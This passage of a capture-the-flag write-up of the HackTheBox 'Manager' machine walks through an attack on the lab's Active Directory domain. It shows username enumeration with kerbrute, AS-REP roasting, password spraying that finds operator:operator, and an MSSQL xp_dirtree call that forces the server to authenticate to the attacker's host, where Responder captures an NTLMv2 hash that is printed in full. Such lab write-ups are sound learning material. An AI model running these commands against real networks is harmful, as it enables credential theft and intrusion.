+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here we still only see the static webpages, and also js/css files. Nothing interesting once again</p>
+<h3 id="returning-to-active-directory-attacks">Returning to Active Directory Attacks
+</h3><p>While obtaining only a username gives limited information, we can also try to AS-REP roast with just usernames. To gather some legitimate usernames, we can enumerate valid users through Kerberos Pre-Authentication (Kerbrute).</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="err">…</span><span class="o">/</span><span class="n">manager</span><span class="o">/</span><span class="n">results</span><span class="o">/</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">scans</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="n">go</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">kerbrute</span> <span class="n">userenum</span> <span class="o">-</span><span class="n">d</span> <span class="n">manager</span><span class="o">.</span><span class="n">htb</span> <span class="o">--</span><span class="n">dc</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.236</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Usernames</span><span class="o">/</span><span class="n">xato</span><span class="o">-</span><span class="n">net</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="n">million</span><span class="o">-</span><span class="n">usernames</span><span class="o">.</span><span class="n">txt</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">__</span>             <span class="n">__</span>               <span class="n">__</span>     
+</span></span><span class="line"><span class="cl">   <span class="o">/</span> <span class="o">/</span><span class="n">_____</span>  <span class="n">_____</span><span class="o">/</span> <span class="o">/</span><span class="n">_</span>  <span class="n">_______</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span><span class="n">____</span> 
+</span></span><span class="line"><span class="cl">  <span class="o">/</span> <span class="o">//</span><span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="n">__</span> \<span class="o">/</span> <span class="n">___</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="o">/</span> <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \
+</span></span><span class="line"><span class="cl"> <span class="o">/</span> <span class="p">,</span><span class="o">&lt;</span> <span class="o">/</span>  <span class="n">__</span><span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span>  <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span> <span class="o">/</span> <span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="o">/</span><span class="n">_</span><span class="o">/|</span><span class="n">_</span><span class="o">|</span>\<span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>  <span class="o">/</span><span class="n">_</span><span class="o">.</span><span class="n">___</span><span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">/</span>\<span class="n">__</span><span class="o">/</span>\<span class="n">___</span><span class="o">/</span>                                        
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Version</span><span class="p">:</span> <span class="n">dev</span> <span class="p">(</span><span class="n">n</span><span class="o">/</span><span class="n">a</span><span class="p">)</span> <span class="o">-</span> <span class="mi">10</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">23</span> <span class="o">-</span> <span class="n">Ronnie</span> <span class="n">Flathers</span> <span class="err">@</span><span class="n">ropnop</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">30</span> <span class="o">&gt;</span>  <span class="n">Using</span> <span class="n">KDC</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">30</span> <span class="o">&gt;</span>   <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.236</span><span class="p">:</span><span class="mi">88</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">31</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">ryan</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">guest</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">34</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">cheng</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">35</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">raven</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">39</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">administrator</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">49</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">Ryan</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">51</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">Raven</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">56</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">operator</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">39</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">Guest</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">40</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">Administrator</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">21</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">Cheng</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">57</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">jinwoo</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">37</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">RYAN</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">29</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">RAVEN</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">21</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">43</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">GUEST</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2023</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">21</span> <span class="mi">23</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">09</span> <span class="o">&gt;</span>  <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">VALID</span> <span class="n">USERNAME</span><span class="p">:</span>       <span class="n">zhong</span><span class="err">@</span><span class="n">manager</span><span class="o">.</span><span class="n">htb</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now that we have several users, we can see about AS-REP roasting. If an account has the attribute <code>DONT_REQ_PREAUTH</code>, we can request and retrieve an AS-REP hash for that user. If this hash can be cracked offline, we will get complete login credentials for a user. Unfortunately, trying all our usernames doesn&rsquo;t give us any hash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ impacket-GetNPUsers manager.htb/ -usersfile users.txt -format hashcat -outputfile asreproast.txt
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[-] User ryan doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User cheng doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User raven doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User operator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User jinwoo doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User zhong doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User Guest doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span><span class="line"><span class="cl">[-] User Administrator doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After nearly all other options are exhausted, I finally consider password spraying with the same list of usernames:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ cme smb 10.10.11.236 -u users.txt -p users.txt                                                      
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We have a hit with <code>operator:operator</code>. Very cool&hellip;&hellip;..
+With valid credentials, we can dump users to find any we in the kerbrute:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ cme smb 10.10.11.236 -u operator -p operator --users
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             [+] Enumerated domain user(s)
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Operator                       badpwdcount: 1 desc: 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\ChinHae                        badpwdcount: 1 desc: 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\JinWoo                         badpwdcount: 490 desc:                                                                                                                   
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Raven                          badpwdcount: 452 desc:                                                                                                                   
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Ryan                           badpwdcount: 501 desc:                                                                                                                   
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Cheng                          badpwdcount: 499 desc:                                                                                                                   
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Zhong                          badpwdcount: 1 desc: 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account                                                                             
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain                                                            
+</span></span><span class="line"><span class="cl">SMB         10.10.11.236    445    DC01             manager.htb\Administrator                  badpwdcount: 14 desc: Built-in account for administering the computer/domain 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we have a complete user list:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Operator
+</span></span><span class="line"><span class="cl">ChinHae
+</span></span><span class="line"><span class="cl">JinWoo
+</span></span><span class="line"><span class="cl">Raven
+</span></span><span class="line"><span class="cl">Ryan
+</span></span><span class="line"><span class="cl">Cheng
+</span></span><span class="line"><span class="cl">Zhong
+</span></span><span class="line"><span class="cl">krbtgt
+</span></span><span class="line"><span class="cl">Guest
+</span></span><span class="line"><span class="cl">Administrator
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="foothold">Foothold
+</h2><h3 id="enumeration-through-mssql">Enumeration through MSSQL
+</h3><p>The user operator can log into the mysql server:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/manager]
+</span></span><span class="line"><span class="cl">└─$ impacket-mssqlclient operator@10.10.11.236 -windows-auth 
+</span></span><span class="line"><span class="cl">Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">[*] Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+</span></span><span class="line"><span class="cl">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+</span></span><span class="line"><span class="cl">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
+</span></span><span class="line"><span class="cl">[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+</span></span><span class="line"><span class="cl">[!] Press help for extra shell commands
+</span></span><span class="line"><span class="cl">SQL (MANAGER\Operator  guest@master)&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>xp_cmdshell</code> is disabled, but we can still grab the auth hash by using <code>xp_dirtree</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SQL (MANAGER\Operator  guest@master)&gt; xp_dirtree \\10.10.14.130\asdf
+</span></span><span class="line"><span class="cl">subdirectory   depth   file   
+</span></span><span class="line"><span class="cl">------------   -----   ----   
+</span></span><span class="line"><span class="cl">SQL (MANAGER\Operator  guest@master)&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Meanwhile on my kali attacker, responder was set up and receives hash:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/manager<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo responder -I tun0           
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
+</span></span><span class="line"><span class="cl">                                         __
+</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
+</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...                                                                                         
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.10.11.236
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : MANAGER<span class="se">\D</span>C01$
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : DC01$::MANAGER:3ba8f5638ddfbf79:24D8DE0CB08E44422228AFE46D129507:01010000000000008053CCC72005DA010484A96EB96C6D510000000002000800530030005800420001001E00570049004E002D00520035004B004500440038004E00520052004500590004003400570049004E002D00520035004B004500440038004E0052005200450059002E0053003000580042002E004C004F00430041004C000300140053003000580042002E004C004F00430041004C000500140053003000580042002E004C004F00430041004C00070008008053CCC72005DA0106000400020000000800300030000000000000000000000000300000A0D44DBDCE97AF1E697D96B4805912B3F46596596ABF62217A1A9445B02F5E6B0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100330030000000000000000000 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see the authentication is done as the system, DC01$. Typically, passwords for this account will be a very long string of random characters, completely unfeasible to crack. After a quick attempt at cracking using the <code>rockyou</code> wordlist, I gave up on this approach.</p>
+<h3 id="enumerating-the-web-server-filesystem">Enumerating The Web Server Filesystem
+</h3><p>Also using <code>xp_dirtree</code>, we can browse the file system. Since we didn&rsquo;t see much in the web directory from the oustide perspective, I decided to check if maybe I can see more by looking at the filesystem:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SQL (MANAGER\Operator  manager\operator@master)&gt; xp_dirtree \inetpub\wwwroot
+</span></span><span class="line"><span class="cl">subdirectory                      depth   file   
+</span></span><span class="line"><span class="cl">-------------------------------   -----   ----   
+</span></span><span class="line"><span class="cl">about.html                            1      1   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">contact.html                          1      1   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">css                                   1      0   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">images                                1      0   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">index.html                            1      1   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">js                                    1      0   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">service.html                          1      1   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">web.config                            1      1   
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">website-backup-27-07-23-old.zip       1      1   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The backup file is extremely unusual. While xp_dirtree itself doesn&rsquo;t seem to have the option of downloading, note this is in the web root folder, meaning it should be accessible through the website. Which it is!</p>
+<p><img src="/p/hackthebox-manager/Images/download.png"
+	width="1203"
+	height="148"
+	srcset="/p/hackthebox-manager/Images/download_hu1533095530586825334.png 480w, /p/hackthebox-manager/Images/download_hu10581869382876535638.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="812"
+		data-flex-basis="1950px"
+	
+></p>
+<p>When we unzip the backup, note that there is a &ldquo;secret&rdquo; conf file:</p>
+<div class="highlight"><div class="chroma">
